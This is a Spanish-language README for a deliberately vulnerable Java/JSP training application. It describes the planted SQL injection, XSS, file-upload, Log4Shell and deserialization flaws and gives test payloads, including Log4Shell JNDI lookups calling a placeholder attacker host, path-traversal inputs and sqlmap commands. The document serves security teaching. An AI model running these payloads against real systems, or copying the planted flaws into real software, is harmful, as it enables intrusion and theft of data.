# WSP2 - SecDevOps Vulnerable Demo

## 📖 Descripción

**WSP2** es una aplicación web Java/JSP diseñada específicamente para **propósitos educativos** en **SecDevOps** y **seguridad de aplicaciones**. Esta aplicación contiene múltiples vulnerabilidades conocidas implementadas intencionalmente para demostrar conceptos de seguridad y técnicas de testing.

> ⚠️ **ADVERTENCIA**: Esta aplicación es **DELIBERADAMENTE VULNERABLE** y **NUNCA** debe ser desplegada en un entorno de producción.

## 🛡️ Vulnerabilidades Incluidas

### 1. **SQL Injection**
- ✅ Concatenación directa de parámetros en consultas SQL
- ✅ Sin uso de prepared statements
- ✅ Exposición de estructura de base de datos
- ✅ Ejecución de consultas SQL arbitrarias

### 2. **Cross-Site Scripting (XSS)**
- ✅ XSS Reflected sin sanitización
- ✅ XSS Stored en formularios
- ✅ Ejecución de JavaScript malicioso
- ✅ Manipulación del DOM

### 3. **Information Disclosure**
- ✅ Exposición de headers HTTP
- ✅ Variables de sistema expuestas
- ✅ Credenciales hardcodeadas
- ✅ Información de debug en producción
- ✅ Stack traces detallados

### 4. **Authentication & Session Management**
- ✅ Credenciales débiles
- ✅ Autenticación hardcodeada
- ✅ Gestión insegura de sesiones
- ✅ No validación de roles

### 5. **File Upload Vulnerabilities**
- ✅ Sin validación de tipo de archivo
- ✅ Path traversal
- ✅ Ejecución de archivos subidos
- ✅ Sin límites de tamaño

### 6. **Log4Shell (CVE-2021-44228)**
- ✅ Log4j 2.14.1 vulnerable
- ✅ LDAP/JNDI lookups habilitados
- ✅ Logging de input del usuario

### 7. **Deserialization Vulnerabilities**
- ✅ Commons Collections 3.2.1 vulnerable
- ✅ Jackson Databind 2.9.8 vulnerable

## 🏗️ Arquitectura

```
wsp2/
├── pom.xml                           # Configuración Maven con dependencias vulnerables
├── src/
│   ├── main/
│   │   ├── java/com/secdevops/wsp2/ # Servlets Java
│   │   │   ├── HeadersServlet.java   # Exposición de headers HTTP
│   │   │   └── WhoIAmServlet.java    # Sistema de autenticación vulnerable
│   │   ├── resources/
│   │   │   └── log4j2.xml           # Configuración Log4j vulnerable
│   │   └── webapp/
│   │       ├── WEB-INF/web.xml      # Configuración web
│   │       ├── css/style.css        # Estilos modernos
│   │       ├── index.jsp            # Página principal con XSS
│   │       ├── upload.jsp           # Subida de archivos vulnerable
│   │       └── database.jsp         # Consultas SQL vulnerables
│   └── test/                        # Tests (vacío)
└── README.md                        # Este archivo
```

## 🚀 Instalación y Ejecución

### Prerrequisitos
- Java 11 o superior
- Maven 3.6+
- Navegador web

### Pasos de instalación

1. **Clonar o descargar el proyecto**
```bash
cd wsp2
```

2. **Compilar la aplicación**
```bash
mvn clean compile
```

3. **Ejecutar con Tomcat embebido**
```bash
mvn tomcat7:run
```

4. **Acceder a la aplicación**
```
http://localhost:8080
```

### Usuarios de prueba
- **admin** / **password123** (Administrador)
- **user** / **user123** (Usuario normal)  
- **guest** / **guest** (Invitado)

## 🎯 Escenarios de Testing

### SQL Injection Testing

**En la página Database (`/database.jsp`):**

```sql
-- Consultas de reconocimiento
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name='users'

-- Bypass de autenticación  
' OR '1'='1' --
admin' OR '1'='1' --

-- Union-based injection
1 UNION SELECT password,username,email,role,id FROM users
```

### XSS Testing

**En la búsqueda principal (`/index.jsp`):**

```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### File Upload Testing

**En Upload (`/upload.jsp`):**

```bash
# Path traversal
../../etc/passwd
../../../windows/system32/

# Archivos maliciosos
shell.php
backdoor.jsp
malware.exe
```

### Log4Shell Testing

**En cualquier campo de input:**

```bash
${jndi:ldap://attacker.com/exploit}
${jndi:dns://attacker.com}
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attacker.com/a}
```

## 🔍 Funcionalidades Principales

### 1. **Headers HTTP** (`/headers`)
- Visualización de todos los headers HTTP
- Exposición de información del servidor
- Variables de sistema expuestas

### 2. **Who I Am** (`/whoiam`) 
- Sistema de autenticación vulnerable
- SQL injection en login
- Gestión insegura de sesiones
- Panel de administración expuesto

### 3. **File Upload** (`/upload.jsp`)
- Subida sin validación
- Path traversal
- Listado de archivos del sistema

### 4. **Database** (`/database.jsp`)
- Consultas SQL directas
- Base de datos H2 en memoria
- Múltiples vectores de SQL injection

## 🔬 Para Investigadores de Seguridad

### Herramientas Recomendadas

- **OWASP ZAP** - Proxy de interceptación
- **Burp Suite** - Testing de penetración web
- **SQLMap** - Explotación automática de SQL injection
- **Nikto** - Scanner de vulnerabilidades web
- **Nuclei** - Scanner de vulnerabilidades

### Comandos de Ejemplo

```bash
# Escaneo con Nikto
nikto -h http://localhost:8080

# SQL injection con SQLMap
sqlmap -u "http://localhost:8080/database.jsp?userId=1" --dbs

# Fuzzing con wfuzz
wfuzz -w wordlist.txt -u http://localhost:8080/FUZZ

# Escaneo con Nuclei
nuclei -u http://localhost:8080
```

## 📚 Objetivos Educativos

Esta aplicación permite aprender:

1. **Identificación de vulnerabilidades** en código real
2. **Técnicas de explotación** comunes
3. **Metodologías de testing** de seguridad
4. **Implementación de contramedidas**
5. **Análisis de código** vulnerable vs seguro

## ⚡ Tecnologías Utilizadas

- **Java 11** - Lenguaje de programación
- **JSP/Servlets** - Tecnología web
- **Maven** - Gestión de dependencias
- **H2 Database** - Base de datos en memoria
- **Log4j 2.14.1** - Sistema de logging (vulnerable)
- **Tomcat** - Servidor de aplicaciones

## 🔐 Contramedidas (Para Referencia)

### SQL Injection
```java
// MAL ❌
String sql = "SELECT * FROM users WHERE id = " + userId;

// BIEN ✅  
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setString(1, userId);
```

### XSS Prevention
```java
// MAL ❌
out.println("<p>" + userInput + "</p>");

// BIEN ✅
out.println("<p>" + StringEscapeUtils.escapeHtml4(userInput) + "</p>");
```

### File Upload Security
```java
// BIEN ✅
- Validar tipo MIME
- Lista blanca de extensiones
- Escaneo de malware
- Limitar tamaño
- Validar nombres de archivo
```

## ⚠️ Disclaimer Legal

Esta aplicación está diseñada **EXCLUSIVAMENTE** para:

- ✅ Propósitos educativos
- ✅ Training de seguridad
- ✅ Investigación autorizada
- ✅ Demostraciones controladas

**NO está destinada para:**

- ❌ Uso en producción
- ❌ Actividades maliciosas
- ❌ Testing no autorizado
- ❌ Distribución con intenciones dañinas

## 📞 Contacto

Para reportar issues, mejoras o preguntas relacionadas con esta aplicación educativa, por favor crear un issue en el repositorio correspondiente.

---

**Desarrollado con 💖 para la comunidad SecDevOps**

*Versión: 1.0-VULNERABLE* 